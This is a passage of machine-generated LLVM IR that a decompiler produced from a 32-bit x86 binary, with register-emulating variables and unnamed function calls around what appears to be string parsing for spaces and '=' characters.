  %v1_8049128 = add i32 %v1_8049124, -16
  %v2_8049128 = inttoptr i32 %v1_8049128 to i32*
  store i32 40, i32* %v2_8049128, align 4
  %v3_804912a = call i32 @function_80511f0(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_804912a, i32* %eax.global-to-local, align 4
  %v0_804912f = load i32, i32* @esp, align 4
  %v9_804912f = icmp eq i32 %v0_804912f, -12
  store i1 %v9_804912f, i1* %zf.global-to-local, align 1
  %v2_8049132 = add i32 %v0_804912f, 8
  %v3_8049132 = inttoptr i32 %v2_8049132 to i32*
  store i32 %v3_804912a, i32* %v3_8049132, align 4
  %v1_8049133 = add i32 %v0_804912f, 120
  %v2_8049133 = inttoptr i32 %v1_8049133 to i32*
  %v3_8049133 = load i32, i32* %v2_8049133, align 4
  store i32 %v3_8049133, i32* @edx, align 4
  %v2_8049137 = add i32 %v0_804912f, 4
  %v3_8049137 = inttoptr i32 %v2_8049137 to i32*
  store i32 %v3_8049133, i32* %v3_8049137, align 4
  %v1_8049138 = add i32 %v0_804912f, 147
  store i32 %v1_8049138, i32* %eax.global-to-local, align 4
  %v3_804913f = inttoptr i32 %v0_804912f to i32*
  store i32 %v1_8049138, i32* %v3_804913f, align 4
  %v4_8049140 = call i32 @function_8051ee0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_8049145 = load i32, i32* @esp, align 4
  %v1_8049148 = add i32 %v4_8049140, 1
  %v8_8049148 = icmp eq i32 %v1_8049148, 0
  store i1 %v8_8049148, i1* %zf.global-to-local, align 1
  store i32 %v1_8049148, i32* %eax.global-to-local, align 4
  br i1 %v8_8049148, label %dec_label_pc_8049a67, label %dec_label_pc_804914f

dec_label_pc_804914f:                             ; preds = %dec_label_pc_8049124
  %v2_804914f = add i32 %v0_8049145, 12
  %v3_804914f = inttoptr i32 %v2_804914f to i32*
  store i32 %v1_8049148, i32* %v3_804914f, align 4
  %v0_8049150 = load i32, i32* %eax.global-to-local, align 4
  %v2_8049150 = add i32 %v0_8049145, 8
  %v3_8049150 = inttoptr i32 %v2_8049150 to i32*
  store i32 %v0_8049150, i32* %v3_8049150, align 4
  %v1_8049151 = add i32 %v0_8049145, 4
  %v2_8049151 = inttoptr i32 %v1_8049151 to i32*
  store i32 0, i32* %v2_8049151, align 4
  %v2_8049153 = inttoptr i32 %v0_8049145 to i32*
  store i32 40, i32* %v2_8049153, align 4
  %v3_8049155 = call i32 @function_80511f0(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_8049155, i32* %eax.global-to-local, align 4
  %v0_804915a = load i32, i32* @esp, align 4
  %v9_804915a = icmp eq i32 %v0_804915a, -12
  store i1 %v9_804915a, i1* %zf.global-to-local, align 1
  %v2_804915d = add i32 %v0_804915a, 8
  %v3_804915d = inttoptr i32 %v2_804915d to i32*
  store i32 %v3_8049155, i32* %v3_804915d, align 4
  %v1_804915e = add i32 %v0_804915a, 120
  %v2_804915e = inttoptr i32 %v1_804915e to i32*
  %v3_804915e = load i32, i32* %v2_804915e, align 4
  store i32 %v3_804915e, i32* %eax.global-to-local, align 4
  %v2_8049162 = add i32 %v0_804915a, 4
  %v3_8049162 = inttoptr i32 %v2_8049162 to i32*
  store i32 %v3_804915e, i32* %v3_8049162, align 4
  %v1_8049163 = add i32 %v0_804915a, 147
  store i32 %v1_8049163, i32* @edx, align 4
  %v3_804916a = inttoptr i32 %v0_804915a to i32*
  store i32 %v1_8049163, i32* %v3_804916a, align 4
  %v4_804916b = call i32 @function_8051ee0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804916b, i32* %eax.global-to-local, align 4
  %v0_8049170 = load i32, i32* @esp, align 4
  %v6_8049170 = icmp eq i32 %v0_8049170, -16
  store i1 %v6_8049170, i1* %zf.global-to-local, align 1
  store i32 %v4_804916b, i32* %ebx.global-to-local, align 4
  %v2_8049175 = add i32 %v4_804916b, 147
  %v3_8049175 = add i32 %v2_8049175, %v0_8049170
  %v4_8049175 = inttoptr i32 %v3_8049175 to i8*
  %v5_8049175 = load i8, i8* %v4_8049175, align 1
  %v11_8049175 = icmp eq i8 %v5_8049175, 32
  %v1_804917d = zext i1 %v11_8049175 to i32
  %v1_8049180 = add i32 %v0_8049170, 147
  store i32 %v1_8049180, i32* %esi.global-to-local, align 4
  store i32 %v1_804917d, i32* %eax.global-to-local, align 4
  %v1_804918c = add i32 %v0_8049170, 12
  %v2_804918c = inttoptr i32 %v1_804918c to i32*
  store i32 2, i32* %v2_804918c, align 4
  %v1_804918e = add i32 %v0_8049170, 8
  %v2_804918e = inttoptr i32 %v1_804918e to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8054ac6.10 to i32), i32* %v2_804918e, align 4
  %v0_8049193 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8049193 = load i32, i32* %eax.global-to-local, align 4
  %v2_8049193 = add i32 %v1_8049193, %v0_8049193
  store i32 %v2_8049193, i32* @ebx, align 4
  %v1_8049195 = add i32 %v0_8049170, 120
  %v2_8049195 = inttoptr i32 %v1_8049195 to i32*
  %v3_8049195 = load i32, i32* %v2_8049195, align 4
  %v2_8049199 = sub i32 %v3_8049195, %v2_8049193
  store i32 %v2_8049199, i32* %eax.global-to-local, align 4
  %v0_804919b = load i32, i32* %esi.global-to-local, align 4
  %v2_804919b = add i32 %v0_804919b, %v2_8049193
  %v12_804919b = icmp eq i32 %v2_804919b, 0
  store i1 %v12_804919b, i1* %zf.global-to-local, align 1
  store i32 %v2_804919b, i32* @esi, align 4
  %v2_804919d = add i32 %v0_8049170, 4
  %v3_804919d = inttoptr i32 %v2_804919d to i32*
  store i32 %v2_8049199, i32* %v3_804919d, align 4
  %v0_804919e = load i32, i32* @esi, align 4
  %v3_804919e = inttoptr i32 %v0_8049170 to i32*
  store i32 %v0_804919e, i32* %v3_804919e, align 4
  %v0_804919f = call i32 @function_8051ca0()
  store i32 %v0_804919f, i32* %eax.global-to-local, align 4
  %v0_80491a4 = load i32, i32* @esp, align 4
  store i32 %v0_804919f, i32* %edx.global-to-local, align 4
  %v10_80491a9 = icmp eq i32 %v0_804919f, -1
  store i1 %v10_80491a9, i1* %zf.global-to-local, align 1
  br i1 %v10_80491a9, label %dec_label_pc_80491db, label %dec_label_pc_80491ae

dec_label_pc_80491ae:                             ; preds = %dec_label_pc_804914f
  %v10_80491ae = icmp eq i32 %v0_804919f, 1
  store i1 %v10_80491ae, i1* %zf.global-to-local, align 1
  %v7_80491b1 = icmp sgt i32 %v0_804919f, 1
  br i1 %v7_80491b1, label %dec_label_pc_80491b3, label %dec_label_pc_80491b6

dec_label_pc_80491b3:                             ; preds = %dec_label_pc_80491ae
  %v1_80491b3 = add i32 %v0_804919f, -2
  %v9_80491b3 = icmp eq i32 %v1_80491b3, 0
  store i1 %v9_80491b3, i1* %zf.global-to-local, align 1
  store i32 %v1_80491b3, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80491b6

dec_label_pc_80491b6:                             ; preds = %dec_label_pc_80491ae, %dec_label_pc_80491b3
  %v1_80491bf = phi i32 [ %v0_804919f, %dec_label_pc_80491ae ], [ %v1_80491b3, %dec_label_pc_80491b3 ]
  %v1_80491b6 = add i32 %v0_80491a4, 20920
  %v1_80491bd = load i32, i32* @ebx, align 4
  %v2_80491bd = add i32 %v1_80491b6, %v1_80491bd
  %v12_80491bd = icmp eq i32 %v2_80491bd, 0
  store i1 %v12_80491bd, i1* %zf.global-to-local, align 1
  store i32 %v2_80491bd, i32* %eax.global-to-local, align 4
  %v2_80491bf = add i32 %v1_80491bf, -20773
  %v3_80491bf = add i32 %v2_80491bf, %v2_80491bd
  %v4_80491bf = inttoptr i32 %v3_80491bf to i8*
  store i8 0, i8* %v4_80491bf, align 1
  %v0_80491c7 = load i32, i32* %eax.global-to-local, align 4
  %v1_80491c7 = load i32, i32* @esp, align 4
  %v2_80491c7 = add i32 %v1_80491c7, -4
  %v3_80491c7 = inttoptr i32 %v2_80491c7 to i32*
  store i32 %v0_80491c7, i32* %v3_80491c7, align 4
  %v0_80491c8 = load i32, i32* %eax.global-to-local, align 4
  %v2_80491c8 = add i32 %v1_80491c7, -8
  %v3_80491c8 = inttoptr i32 %v2_80491c8 to i32*
  store i32 %v0_80491c8, i32* %v3_80491c8, align 4
  %v1_80491c9 = add i32 %v1_80491c7, -12
  %v2_80491c9 = inttoptr i32 %v1_80491c9 to i32*
  store i32 10, i32* %v2_80491c9, align 4
  %v0_80491cb = load i32, i32* @esi, align 4
  %v2_80491cb = add i32 %v1_80491c7, -16
  %v3_80491cb = inttoptr i32 %v2_80491cb to i32*
  store i32 %v0_80491cb, i32* %v3_80491cb, align 4
  %v3_80491cc = call i32 @function_8051cf0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_80491cc, i32* %eax.global-to-local, align 4
  %v0_80491d1 = load i32, i32* @esp, align 4
  %v1_80491d1 = add i32 %v0_80491d1, 108
  %v2_80491d1 = inttoptr i32 %v1_80491d1 to i32*
  %v3_80491d1 = load i32, i32* %v2_80491d1, align 4
  store i32 %v3_80491d1, i32* %ecx.global-to-local, align 4
  %v6_80491d5 = icmp eq i32 %v0_80491d1, -16
  store i1 %v6_80491d5, i1* %zf.global-to-local, align 1
  %v2_80491d8 = add i32 %v3_80491d1, 12
  %v3_80491d8 = inttoptr i32 %v2_80491d8 to i32*
  store i32 %v3_80491cc, i32* %v3_80491d8, align 4
  br label %dec_label_pc_80491db

dec_label_pc_80491db:                             ; preds = %dec_label_pc_804914f, %dec_label_pc_8049a67, %dec_label_pc_80491b6
  store i1 true, i1* %zf.global-to-local, align 1
  %v1_80491e0.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80491e0

dec_label_pc_80491e0:                             ; preds = %dec_label_pc_8049301, %dec_label_pc_80491db
  %v1_80491e0 = phi i32 [ %v1_80491e0.pre, %dec_label_pc_80491db ], [ %v0_8049301, %dec_label_pc_8049301 ]
  %storemerge6 = phi i32 [ 0, %dec_label_pc_80491db ], [ %v3_8049301, %dec_label_pc_8049301 ]
  store i32 %storemerge6, i32* @esi, align 4
  %v0_80491e0 = load i32, i32* %eax.global-to-local, align 4
  %v2_80491e0 = add i32 %v1_80491e0, -4
  %v3_80491e0 = inttoptr i32 %v2_80491e0 to i32*
  store i32 %v0_80491e0, i32* %v3_80491e0, align 4
  %v0_80491e1 = load i32, i32* %eax.global-to-local, align 4
  %v2_80491e1 = add i32 %v1_80491e0, -8
  %v3_80491e1 = inttoptr i32 %v2_80491e1 to i32*
  store i32 %v0_80491e1, i32* %v3_80491e1, align 4
  %v1_80491e2 = add i32 %v1_80491e0, -12
  %v2_80491e2 = inttoptr i32 %v1_80491e2 to i32*
  store i32 0, i32* %v2_80491e2, align 4
  %v1_80491e4 = add i32 %v1_80491e0, -16
  %v2_80491e4 = inttoptr i32 %v1_80491e4 to i32*
  store i32 39, i32* %v2_80491e4, align 4
  %v3_80491e6 = call i32 @function_80511f0(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_80491e6, i32* %eax.global-to-local, align 4
  %v0_80491eb = load i32, i32* @esp, align 4
  %v1_80491eb = add i32 %v0_80491eb, 147
  %v1_80491f5 = load i32, i32* @esi, align 4
  %v2_80491f5 = add i32 %v1_80491eb, %v1_80491f5
  %v12_80491f5 = icmp eq i32 %v2_80491f5, 0
  store i1 %v12_80491f5, i1* %zf.global-to-local, align 1
  store i32 %v2_80491f5, i32* @ebx, align 4
  %v2_80491f7 = add i32 %v0_80491eb, 8
  %v3_80491f7 = inttoptr i32 %v2_80491f7 to i32*
  store i32 %v3_80491e6, i32* %v3_80491f7, align 4
  %v1_80491f8 = add i32 %v0_80491eb, 120
  %v2_80491f8 = inttoptr i32 %v1_80491f8 to i32*
  %v3_80491f8 = load i32, i32* %v2_80491f8, align 4
  store i32 %v3_80491f8, i32* @ebp, align 4
  %v2_80491fc = add i32 %v0_80491eb, 4
  %v3_80491fc = inttoptr i32 %v2_80491fc to i32*
  store i32 %v3_80491f8, i32* %v3_80491fc, align 4
  %v0_80491fd = load i32, i32* @ebx, align 4
  %v3_80491fd = inttoptr i32 %v0_80491eb to i32*
  store i32 %v0_80491fd, i32* %v3_80491fd, align 4
  %v4_80491fe = call i32 @function_8051ee0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_8049203 = load i32, i32* @esp, align 4
  %v1_8049206 = add i32 %v4_80491fe, 1
  %v8_8049206 = icmp eq i32 %v1_8049206, 0
  store i1 %v8_8049206, i1* %zf.global-to-local, align 1
  store i32 %v1_8049206, i32* %eax.global-to-local, align 4
  br i1 %v8_8049206, label %dec_label_pc_80493d2, label %dec_label_pc_804920d

dec_label_pc_804920d:                             ; preds = %dec_label_pc_80491e0
  %v1_804920d = add i32 %v0_8049203, 108
  %v2_804920d = inttoptr i32 %v1_804920d to i32*
  %v3_804920d = load i32, i32* %v2_804920d, align 4
  store i32 %v3_804920d, i32* %edx.global-to-local, align 4
  %v1_8049211 = add i32 %v3_804920d, 16
  %v2_8049211 = inttoptr i32 %v1_8049211 to i32*
  %v3_8049211 = load i32, i32* %v2_8049211, align 4
  %v4_8049211 = add i32 %v3_8049211, -4
  %v9_8049211 = sub i32 3, %v3_8049211
  %v10_8049211 = and i32 %v9_8049211, %v3_8049211
  %v11_8049211 = icmp slt i32 %v10_8049211, 0
  %v12_8049211 = icmp eq i32 %v4_8049211, 0
  store i1 %v12_8049211, i1* %zf.global-to-local, align 1
  %v13_8049211 = icmp slt i32 %v4_8049211, 0
  %v3_8049215 = icmp eq i1 %v13_8049211, %v11_8049211
  %v4_8049215 = icmp eq i1 %v12_8049211, false
  %v5_8049215 = and i1 %v4_8049215, %v3_8049215
  br i1 %v5_8049215, label %dec_label_pc_80493d2, label %dec_label_pc_804921b

dec_label_pc_804921b:                             ; preds = %dec_label_pc_804920d
  %v2_804921b = add i32 %v0_8049203, 12
  %v3_804921b = inttoptr i32 %v2_804921b to i32*
  store i32 %v1_8049206, i32* %v3_804921b, align 4
  %v0_804921c = load i32, i32* %eax.global-to-local, align 4
  %v2_804921c = add i32 %v0_8049203, 8
  %v3_804921c = inttoptr i32 %v2_804921c to i32*
  store i32 %v0_804921c, i32* %v3_804921c, align 4
  %v1_804921d = add i32 %v0_8049203, 4
  %v2_804921d = inttoptr i32 %v1_804921d to i32*
  store i32 0, i32* %v2_804921d, align 4
  %v2_804921f = inttoptr i32 %v0_8049203 to i32*
  store i32 39, i32* %v2_804921f, align 4
  %v3_8049221 = call i32 @function_80511f0(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_8049221, i32* %eax.global-to-local, align 4
  %v0_8049226 = load i32, i32* @esp, align 4
  %v9_8049226 = icmp eq i32 %v0_8049226, -12
  store i1 %v9_8049226, i1* %zf.global-to-local, align 1
  %v2_8049229 = add i32 %v0_8049226, 8
  %v3_8049229 = inttoptr i32 %v2_8049229 to i32*
  store i32 %v3_8049221, i32* %v3_8049229, align 4
  %v1_804922a = add i32 %v0_8049226, 120
  %v2_804922a = inttoptr i32 %v1_804922a to i32*
  %v3_804922a = load i32, i32* %v2_804922a, align 4
  store i32 %v3_804922a, i32* %eax.global-to-local, align 4
  %v2_804922e = add i32 %v0_8049226, 4
  %v3_804922e = inttoptr i32 %v2_804922e to i32*
  store i32 %v3_804922a, i32* %v3_804922e, align 4
  %v0_804922f = load i32, i32* @ebx, align 4
  %v3_804922f = inttoptr i32 %v0_8049226 to i32*
  store i32 %v0_804922f, i32* %v3_804922f, align 4
  %v4_8049230 = call i32 @function_8051ee0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8049230, i32* %eax.global-to-local, align 4
  %v0_8049235 = load i32, i32* @esi, align 4
  %v2_8049235 = add i32 %v0_8049235, %v4_8049230
  store i32 %v2_8049235, i32* %edx.global-to-local, align 4
  %v1_8049238 = load i32, i32* @esp, align 4
  %v2_8049238 = add i32 %v1_8049238, 124
  %v3_8049238 = inttoptr i32 %v2_8049238 to i32*
  store i32 %v2_8049235, i32* %v3_8049238, align 4
  %v0_804923c = load i32, i32* @esp, align 4
  %v1_804923c = add i32 %v0_804923c, 16
  %v6_804923c = icmp eq i32 %v1_804923c, 0
  store i1 %v6_804923c, i1* %zf.global-to-local, align 1
  %v1_804923f = load i32, i32* %edx.global-to-local, align 4
  %v2_804923f = add i32 %v0_804923c, 147
  %v3_804923f = add i32 %v2_804923f, %v1_804923f
  %v4_804923f = inttoptr i32 %v3_804923f to i8*
  %v5_804923f = load i8, i8* %v4_804923f, align 1
  %v11_804923f = icmp eq i8 %v5_804923f, 32
  store i1 %v11_804923f, i1* %zf.global-to-local, align 1
  br i1 %v11_804923f, label %dec_label_pc_804939a, label %dec_label_pc_804924d

dec_label_pc_804924d:                             ; preds = %dec_label_pc_804921b, %dec_label_pc_804939a
  %v0_8049256 = phi i32 [ %v1_804923c, %dec_label_pc_804921b ], [ %v0_804924d.pre, %dec_label_pc_804939a ]
  %v1_804924d = add i32 %v0_8049256, 104
  %v2_804924d = inttoptr i32 %v1_804924d to i32*
  %v3_804924d = load i32, i32* %v2_804924d, align 4
  %v0_8049251 = load i32, i32* @ebx, align 4
  %v1_8049251 = load i32, i32* %eax.global-to-local, align 4
  %v2_8049251 = add i32 %v1_8049251, %v0_8049251
  store i32 %v2_8049251, i32* @ebp, align 4
  %v1_8049254 = load i32, i32* @esi, align 4
  %v2_8049254 = sub i32 %v3_804924d, %v1_8049254
  store i32 %v2_8049254, i32* %edi.global-to-local, align 4
  %v1_8049256 = add i32 %v0_8049256, -4
  %v2_8049256 = inttoptr i32 %v1_8049256 to i32*
  store i32 2, i32* %v2_8049256, align 4
  %v0_8049258 = load i32, i32* %edi.global-to-local, align 4
  %v1_8049258 = load i32, i32* %eax.global-to-local, align 4
  %v2_8049258 = sub i32 %v0_8049258, %v1_8049258
  %v12_8049258 = icmp eq i32 %v2_8049258, 0
  store i1 %v12_8049258, i1* %zf.global-to-local, align 1
  store i32 %v2_8049258, i32* @edi, align 4
  %v1_804925a = add i32 %v0_8049256, -8
  %v2_804925a = inttoptr i32 %v1_804925a to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8054ac6.10 to i32), i32* %v2_804925a, align 4
  %v0_804925f = load i32, i32* @edi, align 4
  %v2_804925f = add i32 %v0_8049256, -12
  %v3_804925f = inttoptr i32 %v2_804925f to i32*
  store i32 %v0_804925f, i32* %v3_804925f, align 4
  %v0_8049260 = load i32, i32* @ebp, align 4
  %v2_8049260 = add i32 %v0_8049256, -16
  %v3_8049260 = inttoptr i32 %v2_8049260 to i32*
  store i32 %v0_8049260, i32* %v3_8049260, align 4
  %v0_8049261 = call i32 @function_8051ca0()
  store i32 %v0_8049261, i32* %eax.global-to-local, align 4
  %v0_8049266 = load i32, i32* @esp, align 4
  %v1_8049266 = add i32 %v0_8049266, 16
  store i32 %v0_8049261, i32* @ebx, align 4
  %v10_804926b = icmp eq i32 %v0_8049261, -1
  store i1 %v10_804926b, i1* %zf.global-to-local, align 1
  br i1 %v10_804926b, label %dec_label_pc_8049301, label %dec_label_pc_8049274

dec_label_pc_8049274:                             ; preds = %dec_label_pc_804924d
  %v1_8049274 = add i32 %v0_8049266, 147
  store i32 %v1_8049274, i32* %esi.global-to-local, align 4
  %v1_804927b = add i32 %v0_8049266, 124
  %v2_804927b = inttoptr i32 %v1_804927b to i32*
  %v3_804927b = load i32, i32* %v2_804927b, align 4
  store i32 %v3_804927b, i32* %eax.global-to-local, align 4
  %v2_804927f = add i32 %v3_804927b, %v1_8049274
  store i32 %v2_804927f, i32* @esi, align 4
  %v10_8049281 = icmp eq i32 %v0_8049261, 1
  store i1 %v10_8049281, i1* %zf.global-to-local, align 1
  %v7_8049284 = icmp sgt i32 %v0_8049261, 1
  br i1 %v7_8049284, label %dec_label_pc_8049286, label %dec_label_pc_8049289

dec_label_pc_8049286:                             ; preds = %dec_label_pc_8049274
  %v1_8049286 = add i32 %v0_8049261, -2
  %v9_8049286 = icmp eq i32 %v1_8049286, 0
  store i1 %v9_8049286, i1* %zf.global-to-local, align 1
  store i32 %v1_8049286, i32* @ebx, align 4
  br label %dec_label_pc_8049289

dec_label_pc_8049289:                             ; preds = %dec_label_pc_8049274, %dec_label_pc_8049286
  %v1_8049289 = add i32 %v0_8049266, 12
  %v2_8049289 = inttoptr i32 %v1_8049289 to i32*
  store i32 1, i32* %v2_8049289, align 4
  %v1_804928b = add i32 %v0_8049266, 8
  %v2_804928b = inttoptr i32 %v1_804928b to i32*
  store i32 ptrtoint (i32* @global_var_8054ac9.14 to i32), i32* %v2_804928b, align 4
  %v0_8049290 = load i32, i32* @edi, align 4
  %v2_8049290 = add i32 %v0_8049266, 4
  %v3_8049290 = inttoptr i32 %v2_8049290 to i32*
  store i32 %v0_8049290, i32* %v3_8049290, align 4
  %v0_8049291 = load i32, i32* @ebp, align 4
  %v3_8049291 = inttoptr i32 %v0_8049266 to i32*
  store i32 %v0_8049291, i32* %v3_8049291, align 4
  %v0_8049292 = call i32 @function_8051ca0()
  store i32 %v0_8049292, i32* %eax.global-to-local, align 4
  %v0_8049297 = load i32, i32* @esp, align 4
  %v1_804929a = icmp eq i32 %v0_8049292, 0
  store i1 %v1_804929a, i1* %zf.global-to-local, align 1
  %tmp143 = icmp slt i32 %v0_8049292, 1
  br i1 %tmp143, label %dec_label_pc_8049289.dec_label_pc_80492b2_crit_edge, label %dec_label_pc_804929e

dec_label_pc_8049289.dec_label_pc_80492b2_crit_edge: ; preds = %dec_label_pc_8049289
  %v1_8049297 = add i32 %v0_8049297, 16
  %v1_80492bd.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80492b2

dec_label_pc_804929e:                             ; preds = %dec_label_pc_8049289
  %v1_804929e = add i32 %v0_8049297, 12
  %v2_804929e = inttoptr i32 %v1_804929e to i32*
  store i32 1, i32* %v2_804929e, align 4
  %v1_80492a0 = add i32 %v0_8049297, 8
  %v2_80492a0 = inttoptr i32 %v1_80492a0 to i32*
  store i32 ptrtoint (i32* @global_var_8054ac9.14 to i32), i32* %v2_80492a0, align 4
  %v0_80492a5 = load i32, i32* @edi, align 4
  %v2_80492a5 = add i32 %v0_8049297, 4
  %v3_80492a5 = inttoptr i32 %v2_80492a5 to i32*
  store i32 %v0_80492a5, i32* %v3_80492a5, align 4
  %v0_80492a6 = load i32, i32* @ebp, align 4
  %v3_80492a6 = inttoptr i32 %v0_8049297 to i32*
  store i32 %v0_80492a6, i32* %v3_80492a6, align 4
  %v0_80492a7 = call i32 @function_8051ca0()
  store i32 %v0_80492a7, i32* %eax.global-to-local, align 4
  %v0_80492ac = load i32, i32* @esp, align 4
  %v1_80492ac = add i32 %v0_80492ac, 16
  %v6_80492ac = icmp eq i32 %v1_80492ac, 0
  store i1 %v6_80492ac, i1* %zf.global-to-local, align 1
  %v1_80492af = add i32 %v0_80492a7, -1
  store i32 %v1_80492af, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80492b2

dec_label_pc_80492b2:                             ; preds = %dec_label_pc_8049289.dec_label_pc_80492b2_crit_edge, %dec_label_pc_804929e
  %v1_80492bd = phi i32 [ %v1_80492bd.pre, %dec_label_pc_8049289.dec_label_pc_80492b2_crit_edge ], [ %v1_80492af, %dec_label_pc_804929e ]
  %v0_80492bf = phi i32 [ %v1_8049297, %dec_label_pc_8049289.dec_label_pc_80492b2_crit_edge ], [ %v1_80492ac, %dec_label_pc_804929e ]
  %v1_80492b2 = add i32 %v0_80492bf, 20904
  store i32 %v1_80492b2, i32* %eax.global-to-local, align 4
  %v1_80492b9 = add i32 %v0_80492bf, 108
  %v2_80492b9 = inttoptr i32 %v1_80492b9 to i32*
  %v3_80492b9 = load i32, i32* %v2_80492b9, align 4
  store i32 %v3_80492b9, i32* %edx.global-to-local, align 4
  %v2_80492bd = add i32 %v1_80492b2, %v1_80492bd
  %v12_80492bd = icmp eq i32 %v2_80492bd, 0
  store i1 %v12_80492bd, i1* %zf.global-to-local, align 1
  store i32 %v2_80492bd, i32* %eax.global-to-local, align 4
  %v1_80492bf = add i32 %v0_80492bf, 20900
  %v2_80492bf = inttoptr i32 %v1_80492bf to i32*
  store i32 0, i32* %v2_80492bf, align 4
  %v0_80492ca = load i32, i32* %eax.global-to-local, align 4
  %v1_80492ca = load i32, i32* %edx.global-to-local, align 4
  %v2_80492ca = add i32 %v0_80492ca, -20773
  %v3_80492ca = add i32 %v2_80492ca, %v1_80492ca
  %v4_80492ca = inttoptr i32 %v3_80492ca to i8*
  store i8 0, i8* %v4_80492ca, align 1
  br label %dec_label_pc_80492e4

dec_label_pc_80492d4:                             ; preds = %dec_label_pc_80492e4
  br i1 %v13_80492d4, label %dec_label_pc_804930a, label %dec_label_pc_80492da

dec_label_pc_80492da:                             ; preds = %dec_label_pc_80492d4
  %v1_80492da = add i32 %v3_80492ed, 1
  store i32 %v1_80492da, i32* %eax.global-to-local, align 4
  store i32 %v1_80492da, i32* %v2_80492ed, align 4
  br label %dec_label_pc_80492e4

dec_label_pc_80492e4:                             ; preds = %dec_label_pc_80492b2, %dec_label_pc_80492da
  %v0_80492e4 = load i32, i32* @esp, align 4
  %v9_80492e4 = icmp eq i32 %v0_80492e4, 12
  store i1 %v9_80492e4, i1* %zf.global-to-local, align 1
  %v0_80492e7 = load i32, i32* @esi, align 4
  %v2_80492e7 = add i32 %v0_80492e4, -16
  %v3_80492e7 = inttoptr i32 %v2_80492e7 to i32*
  store i32 %v0_80492e7, i32* %v3_80492e7, align 4
  %v2_80492e8 = call i32 @function_8051bf0(i8* %v1_8048752)
  store i32 %v2_80492e8, i32* %eax.global-to-local, align 4
  %v0_80492ed = load i32, i32* @esp, align 4
  %v1_80492ed = add i32 %v0_80492ed, 20916
  %v2_80492ed = inttoptr i32 %v1_80492ed to i32*
  %v3_80492ed = load i32, i32* %v2_80492ed, align 4
  store i32 %v3_80492ed, i32* @ebx, align 4
  %v2_80492f7 = sub i32 %v2_80492e8, %v3_80492ed
  %v8_80492f7 = xor i32 %v3_80492ed, %v2_80492e8
  %v9_80492f7 = xor i32 %v2_80492f7, %v2_80492e8
  %v10_80492f7 = and i32 %v9_80492f7, %v8_80492f7
  %v11_80492f7 = icmp slt i32 %v10_80492f7, 0
  %v12_80492f7 = icmp eq i32 %v2_80492f7, 0
  store i1 %v12_80492f7, i1* %zf.global-to-local, align 1
  %v13_80492f7 = icmp slt i32 %v2_80492f7, 0
  %v3_80492f9 = icmp eq i1 %v13_80492f7, %v11_80492f7
  %v4_80492f9 = icmp eq i1 %v12_80492f7, false
  %v5_80492f9 = and i1 %v4_80492f9, %v3_80492f9
  %v0_80492d4 = load i32, i32* @esi, align 4
  %v2_80492d4 = add i32 %v0_80492d4, %v3_80492ed
  %v3_80492d4 = inttoptr i32 %v2_80492d4 to i8*
  %v4_80492d4 = load i8, i8* %v3_80492d4, align 1
  %v13_80492d4 = icmp eq i8 %v4_80492d4, 61
  store i1 %v13_80492d4, i1* %zf.global-to-local, align 1
  br i1 %v5_80492f9, label %dec_label_pc_80492d4, label %dec_label_pc_80492fb

dec_label_pc_80492fb:                             ; preds = %dec_label_pc_80492e4
  %v1_80492f4 = add i32 %v0_80492ed, 16
  br i1 %v13_80492d4, label %dec_label_pc_804930a, label %dec_label_pc_8049301

dec_label_pc_8049301:                             ; preds = %dec_label_pc_8049322, %dec_label_pc_8049358, %dec_label_pc_80492fb, %dec_label_pc_804924d, %dec_label_pc_8049369
  %v0_8049301 = phi i32 [ %v1_8049361, %dec_label_pc_8049358 ], [ %v1_80492f4, %dec_label_pc_80492fb ], [ %v1_8049266, %dec_label_pc_804924d ], [ %v0_8049301.pre, %dec_label_pc_8049369 ], [ %v1_8049339, %dec_label_pc_8049322 ]
  %v1_8049301 = add i32 %v0_8049301, 108
  %v2_8049301 = inttoptr i32 %v1_8049301 to i32*
  %v3_8049301 = load i32, i32* %v2_8049301, align 4
  br label %dec_label_pc_80491e0

dec_label_pc_804930a:                             ; preds = %dec_label_pc_80492d4, %dec_label_pc_80492fb
  %v1_804930a = add i32 %v0_80492ed, 108
  %v2_804930a = inttoptr i32 %v1_804930a to i32*
  %v3_804930a = load i32, i32* %v2_804930a, align 4
  store i32 %v3_804930a, i32* %ecx.global-to-local, align 4
  store i32 0, i32* %v2_80492ed, align 4
  %v0_8049319 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8049319 = add i32 %v0_8049319, 16
  %v2_8049319 = inttoptr i32 %v1_8049319 to i32*
  %v3_8049319 = load i32, i32* %v2_8049319, align 4
  %v1_804931c = icmp eq i32 %v3_8049319, 0
  store i1 %v1_804931c, i1* %zf.global-to-local, align 1
  %tmp144 = icmp slt i32 %v3_8049319, 1
  br i1 %tmp144, label %dec_label_pc_8049358, label %dec_label_pc_8049320

dec_label_pc_8049320:                             ; preds = %dec_label_pc_804930a
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8049322

dec_label_pc_8049322:                             ; preds = %dec_label_pc_8049340, %dec_label_pc_8049320
  %v0_8049322 = phi i32 [ %v4_8049353, %dec_label_pc_8049340 ], [ 0, %dec_label_pc_8049320 ]
  %v2_8049322 = mul i32 %v0_8049322, 128
  %v3_8049322 = icmp eq i32 %v2_8049322, 0
  store i1 %v3_8049322, i1* %zf.global-to-local, align 1
  store i32 %v2_8049322, i32* %eax.global-to-local, align 4
  %v0_8049325 = load i32, i32* @edi, align 4
